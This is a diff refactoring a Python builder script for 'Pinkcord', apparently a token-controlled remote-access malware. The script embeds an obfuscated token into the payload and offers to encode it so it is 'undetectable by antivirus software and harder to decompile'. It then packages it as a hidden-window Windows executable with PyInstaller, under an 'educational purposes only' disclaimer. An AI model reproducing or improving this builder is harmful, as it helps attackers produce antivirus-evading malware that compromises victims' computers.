@@ -1,9 +1,15 @@
 import subprocess
 import sys
-import codecs 
+import codecs
 import base64
 import platform
 import os
+
+TOKEN_FILE = 'pinkcord.py'
+TO_BYPASS_FILE = 'to_bypass.txt'
+BYPASS_FILE = 'pinkcord_bypass.py'
+DIST_FOLDER = 'dist'
+
 asciart = '''
   _____ _____ _   _ _  _______ ____  _____  _____  
  |  __ \_   _| \ | | |/ / ____/ __ \|  __ \|  __ \ 
@@ -15,11 +21,15 @@ asciart = '''
 https://github.com/xanonDev/pinkcord
 [!] some functions may not work on linux, so I recommend using windows to run this script
 '''
+
+
 def clear_console():
     if platform.system() == 'Windows':
         os.system('cls')
     else:
         os.system('clear')
+
+
 clear_console()
 print(asciart)
 print("Installing required libraries...")
@@ -35,15 +45,15 @@ token = base64.b32encode(token)
 token = token.decode('utf-8')
 token = codecs.encode(token, 'rot13')
 print("Token encoded[*]")
-print('replacing the token in the pinkcord.py file ....')
-with open('pinkcord.py', 'r') as sc:
+print('Replacing the token in the pinkcord.py file....')
+with open(TOKEN_FILE, 'r') as sc:
     content = sc.read()
     content = content.replace("<TOKEN>", token)
-with open('pinkcord.py', 'w') as sc:
+with open(TOKEN_FILE, 'w') as sc:
     sc.write(content)
 clear_console()
 print(asciart)
-print('Do you want to test pinkcord by running it?')
+print('Do you want to test Pinkcord by running it?')
 print('1. Yes')
 print('2. No')
 answer = input("Choice: ")
@@ -59,39 +69,39 @@ if answer == "1":
     input('Press ENTER when you finish testing')
 clear_console()
 print(asciart)
-print('Do you want to encode pinkcord to make it undetectable by antivirus software and harder to decompile?')
+print('Do you want to encode Pinkcord to make it undetectable by antivirus software and harder to decompile?')
 print('1. Yes')
 print('2. No')
 answer = input("Choice: ")
 if answer == "1":
-    print('Encoding pinkcord...')
-    with open('pinkcord.py', 'r') as sourcecode:
-        with open('to_bypass.txt', 'w') as codefile:
+    print('Encoding Pinkcord...')
+    with open(TOKEN_FILE, 'r') as sourcecode:
+        with open(TO_BYPASS_FILE, 'w') as codefile:
             codefile.write(sourcecode.read())
             subprocess.check_call([sys.executable, 'bypasser.py'])
             codefile.close()
             sourcecode.close()
-    print("creating a bypass script...")
-    with open('to_bypass.txt', 'r') as codefile:
+    print("Creating a bypass script...")
+    with open(TO_BYPASS_FILE, 'r') as codefile:
         encoded_code = codefile.read()
-    with open('pinkcord_bypass.py', 'r') as bypass:
+    with open(BYPASS_FILE, 'r') as bypass:
         content = bypass.read()
         content = content.replace("<BYPASS>", encoded_code)
-    with open('pinkcord_bypass.py', 'w') as bypass:
+    with open(BYPASS_FILE, 'w') as bypass:
         bypass.write(content)
     clear_console()
     print(asciart)
     import PyInstaller.__main__
     print("Generating exe file...")
     params = [
-            '--onefile',
-            '--windowed',
-            'pinkcord_bypass.py'
-        ]
+        '--onefile',
+        '--windowed',
+        BYPASS_FILE
+    ]
     PyInstaller.__main__.run(params)
     clear_console()
     print(asciart)
-    print("[*] pinkcord_bypass.exe generated in the dist folder")
+    print(f"[*] {BYPASS_FILE} generated in the {DIST_FOLDER} folder")
     print("[!] Remember, this program is for educational purposes only and should not be used for illegal activities")
 else:
     clear_console()
@@ -101,10 +111,10 @@ else:
     params = [
         '--onefile',
         '--windowed',
-        'pinkcord.py'
+        TOKEN_FILE
     ]
     PyInstaller.__main__.run(params)
     clear_console()
     print(asciart)
-    print("[*] pinkcord.exe generated in the dist folder")
-    print("[!] Remember, this program is for educational purposes only and should not be used for illegal activities")
+    print(f"[*] pinkcord.exe generated in the {DIST_FOLDER} folder")
+    print("[!] Remember this program is for educational purposes only and should not be used for illegal activities")
